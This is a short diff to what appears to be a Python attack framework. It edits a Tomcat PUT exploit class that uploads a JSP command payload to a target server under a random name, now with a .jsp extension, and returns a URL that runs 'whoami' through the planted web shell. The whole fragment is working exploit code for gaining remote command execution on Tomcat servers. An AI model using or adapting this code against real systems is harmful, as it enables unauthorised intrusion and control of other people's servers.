@@ -50,9 +50,9 @@ class TomcatPutExploitSubServiceClass(BaseSubServiceClass):
         verbose = kwargs.get("verbose", False)
 
         s = generate_random_string()
-        requests.put(f"http://{host}/{s}", verify=False, data=cmd_jsp)
+        requests.put(f"http://{host}/{s}.jsp", verify=False, data=cmd_jsp)
 
-        return f"http://{host}/{s}?cmd=whoami"
+        return f"http://{host}/{s}.jsp?cmd=whoami"
 
 class TomcatPuttestSubServiceClass(BaseSubServiceClass):
     def __init__(self) -> None:
